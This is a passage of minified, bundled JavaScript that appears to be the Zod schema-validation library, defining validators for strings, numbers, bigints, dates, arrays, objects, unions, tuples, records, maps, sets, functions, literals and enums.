this.refinement((Y)=>X.test(Y),{validation:Q,code:B1.invalid_string,...v1.errToObj(J)})}_addCheck(X){return new R6({...this._def,checks:[...this._def.checks,X]})}email(X){return this._addCheck({kind:"email",...v1.errToObj(X)})}url(X){return this._addCheck({kind:"url",...v1.errToObj(X)})}emoji(X){return this._addCheck({kind:"emoji",...v1.errToObj(X)})}uuid(X){return this._addCheck({kind:"uuid",...v1.errToObj(X)})}nanoid(X){return this._addCheck({kind:"nanoid",...v1.errToObj(X)})}cuid(X){return this._addCheck({kind:"cuid",...v1.errToObj(X)})}cuid2(X){return this._addCheck({kind:"cuid2",...v1.errToObj(X)})}ulid(X){return this._addCheck({kind:"ulid",...v1.errToObj(X)})}base64(X){return this._addCheck({kind:"base64",...v1.errToObj(X)})}base64url(X){return this._addCheck({kind:"base64url",...v1.errToObj(X)})}jwt(X){return this._addCheck({kind:"jwt",...v1.errToObj(X)})}ip(X){return this._addCheck({kind:"ip",...v1.errToObj(X)})}cidr(X){return this._addCheck({kind:"cidr",...v1.errToObj(X)})}datetime(X){if(typeof X==="string")return this._addCheck({kind:"datetime",precision:null,offset:!1,local:!1,message:X});return this._addCheck({kind:"datetime",precision:typeof X?.precision>"u"?null:X?.precision,offset:X?.offset??!1,local:X?.local??!1,...v1.errToObj(X?.message)})}date(X){return this._addCheck({kind:"date",message:X})}time(X){if(typeof X==="string")return this._addCheck({kind:"time",precision:null,message:X});return this._addCheck({kind:"time",precision:typeof X?.precision>"u"?null:X?.precision,...v1.errToObj(X?.message)})}duration(X){return this._addCheck({kind:"duration",...v1.errToObj(X)})}regex(X,Q){return this._addCheck({kind:"regex",regex:X,...v1.errToObj(Q)})}includes(X,Q){return this._addCheck({kind:"includes",value:X,position:Q?.position,...v1.errToObj(Q?.message)})}startsWith(X,Q){return this._addCheck({kind:"startsWith",value:X,...v1.errToObj(Q)})}endsWith(X,Q){return this._addCheck({kind:"endsWith",value:X,...v1.errToObj(Q)})}min(X,Q){return this._addCheck({kind:"min",value:X,...v1.errToObj(Q)})}max(X,Q){return this._addCheck({kind:"max",value:X,...v1.errToObj(Q)})}length(X,Q){return this._addCheck({kind:"length",value:X,...v1.errToObj(Q)})}nonempty(X){return this.min(1,v1.errToObj(X))}trim(){return new R6({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new R6({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new R6({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find((X)=>X.kind==="datetime")}get isDate(){return!!this._def.checks.find((X)=>X.kind==="date")}get isTime(){return!!this._def.checks.find((X)=>X.kind==="time")}get isDuration(){return!!this._def.checks.find((X)=>X.kind==="duration")}get isEmail(){return!!this._def.checks.find((X)=>X.kind==="email")}get isURL(){return!!this._def.checks.find((X)=>X.kind==="url")}get isEmoji(){return!!this._def.checks.find((X)=>X.kind==="emoji")}get isUUID(){return!!this._def.checks.find((X)=>X.kind==="uuid")}get isNANOID(){return!!this._def.checks.find((X)=>X.kind==="nanoid")}get isCUID(){return!!this._def.checks.find((X)=>X.kind==="cuid")}get isCUID2(){return!!this._def.checks.find((X)=>X.kind==="cuid2")}get isULID(){return!!this._def.checks.find((X)=>X.kind==="ulid")}get isIP(){return!!this._def.checks.find((X)=>X.kind==="ip")}get isCIDR(){return!!this._def.checks.find((X)=>X.kind==="cidr")}get isBase64(){return!!this._def.checks.find((X)=>X.kind==="base64")}get isBase64url(){return!!this._def.checks.find((X)=>X.kind==="base64url")}get minLength(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X}get maxLength(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X}}R6.create=(X)=>{return new R6({checks:[],typeName:e1.ZodString,coerce:X?.coerce??!1,...G0(X)})};function A_(X,Q){let J=(X.toString().split(".")[1]||"").length,Y=(Q.toString().split(".")[1]||"").length,W=J>Y?J:Y,G=Number.parseInt(X.toFixed(W).replace(".","")),H=Number.parseInt(Q.toFixed(W).replace(".",""));return G%H/10**W}class JX extends U0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(X){if(this._def.coerce)X.data=Number(X.data);if(this._getType(X)!==F1.number){let W=this._getOrReturnCtx(X);return I1(W,{code:B1.invalid_type,expected:F1.number,received:W.parsedType}),n1}let J=void 0,Y=new V9;for(let W of this._def.checks)if(W.kind==="int"){if(!Z0.isInteger(X.data))J=this._getOrReturnCtx(X,J),I1(J,{code:B1.invalid_type,expected:"integer",received:"float",message:W.message}),Y.dirty()}else if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)J=this._getOrReturnCtx(X,J),I1(J,{code:B1.too_small,minimum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)J=this._getOrReturnCtx(X,J),I1(J,{code:B1.too_big,maximum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(A_(X.data,W.value)!==0)J=this._getOrReturnCtx(X,J),I1(J,{code:B1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else if(W.kind==="finite"){if(!Number.isFinite(X.data))J=this._getOrReturnCtx(X,J),I1(J,{code:B1.not_finite,message:W.message}),Y.dirty()}else Z0.assertNever(W);return{status:Y.value,value:X.data}}gte(X,Q){return this.setLimit("min",X,!0,v1.toString(Q))}gt(X,Q){return this.setLimit("min",X,!1,v1.toString(Q))}lte(X,Q){return this.setLimit("max",X,!0,v1.toString(Q))}lt(X,Q){return this.setLimit("max",X,!1,v1.toString(Q))}setLimit(X,Q,J,Y){return new JX({...this._def,checks:[...this._def.checks,{kind:X,value:Q,inclusive:J,message:v1.toString(Y)}]})}_addCheck(X){return new JX({...this._def,checks:[...this._def.checks,X]})}int(X){return this._addCheck({kind:"int",message:v1.toString(X)})}positive(X){return this._addCheck({kind:"min",value:0,inclusive:!1,message:v1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:0,inclusive:!1,message:v1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:0,inclusive:!0,message:v1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:0,inclusive:!0,message:v1.toString(X)})}multipleOf(X,Q){return this._addCheck({kind:"multipleOf",value:X,message:v1.toString(Q)})}finite(X){return this._addCheck({kind:"finite",message:v1.toString(X)})}safe(X){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:v1.toString(X)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:v1.toString(X)})}get minValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X}get maxValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X}get isInt(){return!!this._def.checks.find((X)=>X.kind==="int"||X.kind==="multipleOf"&&Z0.isInteger(X.value))}get isFinite(){let X=null,Q=null;for(let J of this._def.checks)if(J.kind==="finite"||J.kind==="int"||J.kind==="multipleOf")return!0;else if(J.kind==="min"){if(Q===null||J.value>Q)Q=J.value}else if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return Number.isFinite(Q)&&Number.isFinite(X)}}JX.create=(X)=>{return new JX({checks:[],typeName:e1.ZodNumber,coerce:X?.coerce||!1,...G0(X)})};class YX extends U0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte}_parse(X){if(this._def.coerce)try{X.data=BigInt(X.data)}catch{return this._getInvalidInput(X)}if(this._getType(X)!==F1.bigint)return this._getInvalidInput(X);let J=void 0,Y=new V9;for(let W of this._def.checks)if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)J=this._getOrReturnCtx(X,J),I1(J,{code:B1.too_small,type:"bigint",minimum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)J=this._getOrReturnCtx(X,J),I1(J,{code:B1.too_big,type:"bigint",maximum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(X.data%W.value!==BigInt(0))J=this._getOrReturnCtx(X,J),I1(J,{code:B1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else Z0.assertNever(W);return{status:Y.value,value:X.data}}_getInvalidInput(X){let Q=this._getOrReturnCtx(X);return I1(Q,{code:B1.invalid_type,expected:F1.bigint,received:Q.parsedType}),n1}gte(X,Q){return this.setLimit("min",X,!0,v1.toString(Q))}gt(X,Q){return this.setLimit("min",X,!1,v1.toString(Q))}lte(X,Q){return this.setLimit("max",X,!0,v1.toString(Q))}lt(X,Q){return this.setLimit("max",X,!1,v1.toString(Q))}setLimit(X,Q,J,Y){return new YX({...this._def,checks:[...this._def.checks,{kind:X,value:Q,inclusive:J,message:v1.toString(Y)}]})}_addCheck(X){return new YX({...this._def,checks:[...this._def.checks,X]})}positive(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:v1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:v1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:v1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:v1.toString(X)})}multipleOf(X,Q){return this._addCheck({kind:"multipleOf",value:X,message:v1.toString(Q)})}get minValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X}get maxValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X}}YX.create=(X)=>{return new YX({checks:[],typeName:e1.ZodBigInt,coerce:X?.coerce??!1,...G0(X)})};class k7 extends U0{_parse(X){if(this._def.coerce)X.data=Boolean(X.data);if(this._getType(X)!==F1.boolean){let J=this._getOrReturnCtx(X);return I1(J,{code:B1.invalid_type,expected:F1.boolean,received:J.parsedType}),n1}return O9(X.data)}}k7.create=(X)=>{return new k7({typeName:e1.ZodBoolean,coerce:X?.coerce||!1,...G0(X)})};class yX extends U0{_parse(X){if(this._def.coerce)X.data=new Date(X.data);if(this._getType(X)!==F1.date){let W=this._getOrReturnCtx(X);return I1(W,{code:B1.invalid_type,expected:F1.date,received:W.parsedType}),n1}if(Number.isNaN(X.data.getTime())){let W=this._getOrReturnCtx(X);return I1(W,{code:B1.invalid_date}),n1}let J=new V9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.getTime()<W.value)Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.too_small,message:W.message,inclusive:!0,exact:!1,minimum:W.value,type:"date"}),J.dirty()}else if(W.kind==="max"){if(X.data.getTime()>W.value)Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.too_big,message:W.message,inclusive:!0,exact:!1,maximum:W.value,type:"date"}),J.dirty()}else Z0.assertNever(W);return{status:J.value,value:new Date(X.data.getTime())}}_addCheck(X){return new yX({...this._def,checks:[...this._def.checks,X]})}min(X,Q){return this._addCheck({kind:"min",value:X.getTime(),message:v1.toString(Q)})}max(X,Q){return this._addCheck({kind:"max",value:X.getTime(),message:v1.toString(Q)})}get minDate(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X!=null?new Date(X):null}get maxDate(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X!=null?new Date(X):null}}yX.create=(X)=>{return new yX({checks:[],coerce:X?.coerce||!1,typeName:e1.ZodDate,...G0(X)})};class V4 extends U0{_parse(X){if(this._getType(X)!==F1.symbol){let J=this._getOrReturnCtx(X);return I1(J,{code:B1.invalid_type,expected:F1.symbol,received:J.parsedType}),n1}return O9(X.data)}}V4.create=(X)=>{return new V4({typeName:e1.ZodSymbol,...G0(X)})};class b7 extends U0{_parse(X){if(this._getType(X)!==F1.undefined){let J=this._getOrReturnCtx(X);return I1(J,{code:B1.invalid_type,expected:F1.undefined,received:J.parsedType}),n1}return O9(X.data)}}b7.create=(X)=>{return new b7({typeName:e1.ZodUndefined,...G0(X)})};class v7 extends U0{_parse(X){if(this._getType(X)!==F1.null){let J=this._getOrReturnCtx(X);return I1(J,{code:B1.invalid_type,expected:F1.null,received:J.parsedType}),n1}return O9(X.data)}}v7.create=(X)=>{return new v7({typeName:e1.ZodNull,...G0(X)})};class gX extends U0{constructor(){super(...arguments);this._any=!0}_parse(X){return O9(X.data)}}gX.create=(X)=>{return new gX({typeName:e1.ZodAny,...G0(X)})};class QX extends U0{constructor(){super(...arguments);this._unknown=!0}_parse(X){return O9(X.data)}}QX.create=(X)=>{return new QX({typeName:e1.ZodUnknown,...G0(X)})};class d6 extends U0{_parse(X){let Q=this._getOrReturnCtx(X);return I1(Q,{code:B1.invalid_type,expected:F1.never,received:Q.parsedType}),n1}}d6.create=(X)=>{return new d6({typeName:e1.ZodNever,...G0(X)})};class B4 extends U0{_parse(X){if(this._getType(X)!==F1.undefined){let J=this._getOrReturnCtx(X);return I1(J,{code:B1.invalid_type,expected:F1.void,received:J.parsedType}),n1}return O9(X.data)}}B4.create=(X)=>{return new B4({typeName:e1.ZodVoid,...G0(X)})};class L6 extends U0{_parse(X){let{ctx:Q,status:J}=this._processInputParams(X),Y=this._def;if(Q.parsedType!==F1.array)return I1(Q,{code:B1.invalid_type,expected:F1.array,received:Q.parsedType}),n1;if(Y.exactLength!==null){let G=Q.data.length>Y.exactLength.value,H=Q.data.length<Y.exactLength.value;if(G||H)I1(Q,{code:G?B1.too_big:B1.too_small,minimum:H?Y.exactLength.value:void 0,maximum:G?Y.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:Y.exactLength.message}),J.dirty()}if(Y.minLength!==null){if(Q.data.length<Y.minLength.value)I1(Q,{code:B1.too_small,minimum:Y.minLength.value,type:"array",inclusive:!0,exact:!1,message:Y.minLength.message}),J.dirty()}if(Y.maxLength!==null){if(Q.data.length>Y.maxLength.value)I1(Q,{code:B1.too_big,maximum:Y.maxLength.value,type:"array",inclusive:!0,exact:!1,message:Y.maxLength.message}),J.dirty()}if(Q.common.async)return Promise.all([...Q.data].map((G,H)=>{return Y.type._parseAsync(new N6(Q,G,Q.path,H))})).then((G)=>{return V9.mergeArray(J,G)});let W=[...Q.data].map((G,H)=>{return Y.type._parseSync(new N6(Q,G,Q.path,H))});return V9.mergeArray(J,W)}get element(){return this._def.type}min(X,Q){return new L6({...this._def,minLength:{value:X,message:v1.toString(Q)}})}max(X,Q){return new L6({...this._def,maxLength:{value:X,message:v1.toString(Q)}})}length(X,Q){return new L6({...this._def,exactLength:{value:X,message:v1.toString(Q)}})}nonempty(X){return this.min(1,X)}}L6.create=(X,Q)=>{return new L6({type:X,minLength:null,maxLength:null,exactLength:null,typeName:e1.ZodArray,...G0(Q)})};function T7(X){if(X instanceof c0){let Q={};for(let J in X.shape){let Y=X.shape[J];Q[J]=D6.create(T7(Y))}return new c0({...X._def,shape:()=>Q})}else if(X instanceof L6)return new L6({...X._def,type:T7(X.element)});else if(X instanceof D6)return D6.create(T7(X.unwrap()));else if(X instanceof O8)return O8.create(T7(X.unwrap()));else if(X instanceof i6)return i6.create(X.items.map((Q)=>T7(Q)));else return X}class c0 extends U0{constructor(){super(...arguments);this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;let X=this._def.shape(),Q=Z0.objectKeys(X);return this._cached={shape:X,keys:Q},this._cached}_parse(X){if(this._getType(X)!==F1.object){let z=this._getOrReturnCtx(X);return I1(z,{code:B1.invalid_type,expected:F1.object,received:z.parsedType}),n1}let{status:J,ctx:Y}=this._processInputParams(X),{shape:W,keys:G}=this._getCached(),H=[];if(!(this._def.catchall instanceof d6&&this._def.unknownKeys==="strip")){for(let z in Y.data)if(!G.includes(z))H.push(z)}let $=[];for(let z of G){let U=W[z],K=Y.data[z];$.push({key:{status:"valid",value:z},value:U._parse(new N6(Y,K,Y.path,z)),alwaysSet:z in Y.data})}if(this._def.catchall instanceof d6){let z=this._def.unknownKeys;if(z==="passthrough")for(let U of H)$.push({key:{status:"valid",value:U},value:{status:"valid",value:Y.data[U]}});else if(z==="strict"){if(H.length>0)I1(Y,{code:B1.unrecognized_keys,keys:H}),J.dirty()}else if(z==="strip");else throw Error("Internal ZodObject error: invalid unknownKeys value.")}else{let z=this._def.catchall;for(let U of H){let K=Y.data[U];$.push({key:{status:"valid",value:U},value:z._parse(new N6(Y,K,Y.path,U)),alwaysSet:U in Y.data})}}if(Y.common.async)return Promise.resolve().then(async()=>{let z=[];for(let U of $){let K=await U.key,B=await U.value;z.push({key:K,value:B,alwaysSet:U.alwaysSet})}return z}).then((z)=>{return V9.mergeObjectSync(J,z)});else return V9.mergeObjectSync(J,$)}get shape(){return this._def.shape()}strict(X){return v1.errToObj,new c0({...this._def,unknownKeys:"strict",...X!==void 0?{errorMap:(Q,J)=>{let Y=this._def.errorMap?.(Q,J).message??J.defaultError;if(Q.code==="unrecognized_keys")return{message:v1.errToObj(X).message??Y};return{message:Y}}}:{}})}strip(){return new c0({...this._def,unknownKeys:"strip"})}passthrough(){return new c0({...this._def,unknownKeys:"passthrough"})}extend(X){return new c0({...this._def,shape:()=>({...this._def.shape(),...X})})}merge(X){return new c0({unknownKeys:X._def.unknownKeys,catchall:X._def.catchall,shape:()=>({...this._def.shape(),...X._def.shape()}),typeName:e1.ZodObject})}setKey(X,Q){return this.augment({[X]:Q})}catchall(X){return new c0({...this._def,catchall:X})}pick(X){let Q={};for(let J of Z0.objectKeys(X))if(X[J]&&this.shape[J])Q[J]=this.shape[J];return new c0({...this._def,shape:()=>Q})}omit(X){let Q={};for(let J of Z0.objectKeys(this.shape))if(!X[J])Q[J]=this.shape[J];return new c0({...this._def,shape:()=>Q})}deepPartial(){return T7(this)}partial(X){let Q={};for(let J of Z0.objectKeys(this.shape)){let Y=this.shape[J];if(X&&!X[J])Q[J]=Y;else Q[J]=Y.optional()}return new c0({...this._def,shape:()=>Q})}required(X){let Q={};for(let J of Z0.objectKeys(this.shape))if(X&&!X[J])Q[J]=this.shape[J];else{let W=this.shape[J];while(W instanceof D6)W=W._def.innerType;Q[J]=W}return new c0({...this._def,shape:()=>Q})}keyof(){return T2(Z0.objectKeys(this.shape))}}c0.create=(X,Q)=>{return new c0({shape:()=>X,unknownKeys:"strip",catchall:d6.create(),typeName:e1.ZodObject,...G0(Q)})};c0.strictCreate=(X,Q)=>{return new c0({shape:()=>X,unknownKeys:"strict",catchall:d6.create(),typeName:e1.ZodObject,...G0(Q)})};c0.lazycreate=(X,Q)=>{return new c0({shape:X,unknownKeys:"strip",catchall:d6.create(),typeName:e1.ZodObject,...G0(Q)})};class x7 extends U0{_parse(X){let{ctx:Q}=this._processInputParams(X),J=this._def.options;function Y(W){for(let H of W)if(H.result.status==="valid")return H.result;for(let H of W)if(H.result.status==="dirty")return Q.common.issues.push(...H.ctx.common.issues),H.result;let G=W.map((H)=>new y9(H.ctx.common.issues));return I1(Q,{code:B1.invalid_union,unionErrors:G}),n1}if(Q.common.async)return Promise.all(J.map(async(W)=>{let G={...Q,common:{...Q.common,issues:[]},parent:null};return{result:await W._parseAsync({data:Q.data,path:Q.path,parent:G}),ctx:G}})).then(Y);else{let W=void 0,G=[];for(let $ of J){let z={...Q,common:{...Q.common,issues:[]},parent:null},U=$._parseSync({data:Q.data,path:Q.path,parent:z});if(U.status==="valid")return U;else if(U.status==="dirty"&&!W)W={result:U,ctx:z};if(z.common.issues.length)G.push(z.common.issues)}if(W)return Q.common.issues.push(...W.ctx.common.issues),W.result;let H=G.map(($)=>new y9($));return I1(Q,{code:B1.invalid_union,unionErrors:H}),n1}}get options(){return this._def.options}}x7.create=(X,Q)=>{return new x7({options:X,typeName:e1.ZodUnion,...G0(Q)})};var F8=(X)=>{if(X instanceof h7)return F8(X.schema);else if(X instanceof w6)return F8(X.innerType());else if(X instanceof y7)return[X.value];else if(X instanceof WX)return X.options;else if(X instanceof g7)return Z0.objectValues(X.enum);else if(X instanceof m7)return F8(X._def.innerType);else if(X instanceof b7)return[void 0];else if(X instanceof v7)return[null];else if(X instanceof D6)return[void 0,...F8(X.unwrap())];else if(X instanceof O8)return[null,...F8(X.unwrap())];else if(X instanceof PJ)return F8(X.unwrap());else if(X instanceof c7)return F8(X.unwrap());else if(X instanceof u7)return F8(X._def.innerType);else return[]};class CJ extends U0{_parse(X){let{ctx:Q}=this._processInputParams(X);if(Q.parsedType!==F1.object)return I1(Q,{code:B1.invalid_type,expected:F1.object,received:Q.parsedType}),n1;let J=this.discriminator,Y=Q.data[J],W=this.optionsMap.get(Y);if(!W)return I1(Q,{code:B1.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[J]}),n1;if(Q.common.async)return W._parseAsync({data:Q.data,path:Q.path,parent:Q});else return W._parseSync({data:Q.data,path:Q.path,parent:Q})}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(X,Q,J){let Y=new Map;for(let W of Q){let G=F8(W.shape[X]);if(!G.length)throw Error(`A discriminator value for key \`${X}\` could not be extracted from all schema options`);for(let H of G){if(Y.has(H))throw Error(`Discriminator property ${String(X)} has duplicate value ${String(H)}`);Y.set(H,W)}}return new CJ({typeName:e1.ZodDiscriminatedUnion,discriminator:X,options:Q,optionsMap:Y,...G0(J)})}}function hG(X,Q){let J=p6(X),Y=p6(Q);if(X===Q)return{valid:!0,data:X};else if(J===F1.object&&Y===F1.object){let W=Z0.objectKeys(Q),G=Z0.objectKeys(X).filter(($)=>W.indexOf($)!==-1),H={...X,...Q};for(let $ of G){let z=hG(X[$],Q[$]);if(!z.valid)return{valid:!1};H[$]=z.data}return{valid:!0,data:H}}else if(J===F1.array&&Y===F1.array){if(X.length!==Q.length)return{valid:!1};let W=[];for(let G=0;G<X.length;G++){let H=X[G],$=Q[G],z=hG(H,$);if(!z.valid)return{valid:!1};W.push(z.data)}return{valid:!0,data:W}}else if(J===F1.date&&Y===F1.date&&+X===+Q)return{valid:!0,data:X};else return{valid:!1}}class f7 extends U0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X),Y=(W,G)=>{if(wJ(W)||wJ(G))return n1;let H=hG(W.value,G.value);if(!H.valid)return I1(J,{code:B1.invalid_intersection_types}),n1;if(IJ(W)||IJ(G))Q.dirty();return{status:Q.value,value:H.data}};if(J.common.async)return Promise.all([this._def.left._parseAsync({data:J.data,path:J.path,parent:J}),this._def.right._parseAsync({data:J.data,path:J.path,parent:J})]).then(([W,G])=>Y(W,G));else return Y(this._def.left._parseSync({data:J.data,path:J.path,parent:J}),this._def.right._parseSync({data:J.data,path:J.path,parent:J}))}}f7.create=(X,Q,J)=>{return new f7({left:X,right:Q,typeName:e1.ZodIntersection,...G0(J)})};class i6 extends U0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==F1.array)return I1(J,{code:B1.invalid_type,expected:F1.array,received:J.parsedType}),n1;if(J.data.length<this._def.items.length)return I1(J,{code:B1.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),n1;if(!this._def.rest&&J.data.length>this._def.items.length)I1(J,{code:B1.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),Q.dirty();let W=[...J.data].map((G,H)=>{let $=this._def.items[H]||this._def.rest;if(!$)return null;return $._parse(new N6(J,G,J.path,H))}).filter((G)=>!!G);if(J.common.async)return Promise.all(W).then((G)=>{return V9.mergeArray(Q,G)});else return V9.mergeArray(Q,W)}get items(){return this._def.items}rest(X){return new i6({...this._def,rest:X})}}i6.create=(X,Q)=>{if(!Array.isArray(X))throw Error("You must pass an array of schemas to z.tuple([ ... ])");return new i6({items:X,typeName:e1.ZodTuple,rest:null,...G0(Q)})};class q4 extends U0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==F1.object)return I1(J,{code:B1.invalid_type,expected:F1.object,received:J.parsedType}),n1;let Y=[],W=this._def.keyType,G=this._def.valueType;for(let H in J.data)Y.push({key:W._parse(new N6(J,H,J.path,H)),value:G._parse(new N6(J,J.data[H],J.path,H)),alwaysSet:H in J.data});if(J.common.async)return V9.mergeObjectAsync(Q,Y);else return V9.mergeObjectSync(Q,Y)}get element(){return this._def.valueType}static create(X,Q,J){if(Q instanceof U0)return new q4({keyType:X,valueType:Q,typeName:e1.ZodRecord,...G0(J)});return new q4({keyType:R6.create(),valueType:X,typeName:e1.ZodRecord,...G0(Q)})}}class Z4 extends U0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==F1.map)return I1(J,{code:B1.invalid_type,expected:F1.map,received:J.parsedType}),n1;let Y=this._def.keyType,W=this._def.valueType,G=[...J.data.entries()].map(([H,$],z)=>{return{key:Y._parse(new N6(J,H,J.path,[z,"key"])),value:W._parse(new N6(J,$,J.path,[z,"value"]))}});if(J.common.async){let H=new Map;return Promise.resolve().then(async()=>{for(let $ of G){let z=await $.key,U=await $.value;if(z.status==="aborted"||U.status==="aborted")return n1;if(z.status==="dirty"||U.status==="dirty")Q.dirty();H.set(z.value,U.value)}return{status:Q.value,value:H}})}else{let H=new Map;for(let $ of G){let{key:z,value:U}=$;if(z.status==="aborted"||U.status==="aborted")return n1;if(z.status==="dirty"||U.status==="dirty")Q.dirty();H.set(z.value,U.value)}return{status:Q.value,value:H}}}}Z4.create=(X,Q,J)=>{return new Z4({valueType:Q,keyType:X,typeName:e1.ZodMap,...G0(J)})};class mX extends U0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==F1.set)return I1(J,{code:B1.invalid_type,expected:F1.set,received:J.parsedType}),n1;let Y=this._def;if(Y.minSize!==null){if(J.data.size<Y.minSize.value)I1(J,{code:B1.too_small,minimum:Y.minSize.value,type:"set",inclusive:!0,exact:!1,message:Y.minSize.message}),Q.dirty()}if(Y.maxSize!==null){if(J.data.size>Y.maxSize.value)I1(J,{code:B1.too_big,maximum:Y.maxSize.value,type:"set",inclusive:!0,exact:!1,message:Y.maxSize.message}),Q.dirty()}let W=this._def.valueType;function G($){let z=new Set;for(let U of $){if(U.status==="aborted")return n1;if(U.status==="dirty")Q.dirty();z.add(U.value)}return{status:Q.value,value:z}}let H=[...J.data.values()].map(($,z)=>W._parse(new N6(J,$,J.path,z)));if(J.common.async)return Promise.all(H).then(($)=>G($));else return G(H)}min(X,Q){return new mX({...this._def,minSize:{value:X,message:v1.toString(Q)}})}max(X,Q){return new mX({...this._def,maxSize:{value:X,message:v1.toString(Q)}})}size(X,Q){return this.min(X,Q).max(X,Q)}nonempty(X){return this.min(1,X)}}mX.create=(X,Q)=>{return new mX({valueType:X,minSize:null,maxSize:null,typeName:e1.ZodSet,...G0(Q)})};class _7 extends U0{constructor(){super(...arguments);this.validate=this.implement}_parse(X){let{ctx:Q}=this._processInputParams(X);if(Q.parsedType!==F1.function)return I1(Q,{code:B1.invalid_type,expected:F1.function,received:Q.parsedType}),n1;function J(H,$){return K4({data:H,path:Q.path,errorMaps:[Q.common.contextualErrorMap,Q.schemaErrorMap,S7(),j8].filter((z)=>!!z),issueData:{code:B1.invalid_arguments,argumentsError:$}})}function Y(H,$){return K4({data:H,path:Q.path,errorMaps:[Q.common.contextualErrorMap,Q.schemaErrorMap,S7(),j8].filter((z)=>!!z),issueData:{code:B1.invalid_return_type,returnTypeError:$}})}let W={errorMap:Q.common.contextualErrorMap},G=Q.data;if(this._def.returns instanceof uX){let H=this;return O9(async function(...$){let z=new y9([]),U=await H._def.args.parseAsync($,W).catch((q)=>{throw z.addIssue(J($,q)),z}),K=await Reflect.apply(G,this,U);return await H._def.returns._def.type.parseAsync(K,W).catch((q)=>{throw z.addIssue(Y(K,q)),z})})}else{let H=this;return O9(function(...$){let z=H._def.args.safeParse($,W);if(!z.success)throw new y9([J($,z.error)]);let U=Reflect.apply(G,this,z.data),K=H._def.returns.safeParse(U,W);if(!K.success)throw new y9([Y(U,K.error)]);return K.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...X){return new _7({...this._def,args:i6.create(X).rest(QX.create())})}returns(X){return new _7({...this._def,returns:X})}implement(X){return this.parse(X)}strictImplement(X){return this.parse(X)}static create(X,Q,J){return new _7({args:X?X:i6.create([]).rest(QX.create()),returns:Q||QX.create(),typeName:e1.ZodFunction,...G0(J)})}}class h7 extends U0{get schema(){return this._def.getter()}_parse(X){let{ctx:Q}=this._processInputParams(X);return this._def.getter()._parse({data:Q.data,path:Q.path,parent:Q})}}h7.create=(X,Q)=>{return new h7({getter:X,typeName:e1.ZodLazy,...G0(Q)})};class y7 extends U0{_parse(X){if(X.data!==this._def.value){let Q=this._getOrReturnCtx(X);return I1(Q,{received:Q.data,code:B1.invalid_literal,expected:this._def.value}),n1}return{status:"valid",value:X.data}}get value(){return this._def.value}}y7.create=(X,Q)=>{return new y7({value:X,typeName:e1.ZodLiteral,...G0(Q)})};function T2(X,Q){return new WX({values:X,typeName:e1.ZodEnum,...G0(Q)})}class WX extends U0{_parse(X){if(typeof X.data!=="string"){let Q=this._getOrReturnCtx(X),J=this._def.values;return I1(Q,{expected:Z0.joinValues(J),received:Q.parsedType,code:B1.invalid_type}),n1}if(!this._cache)this._cache=new 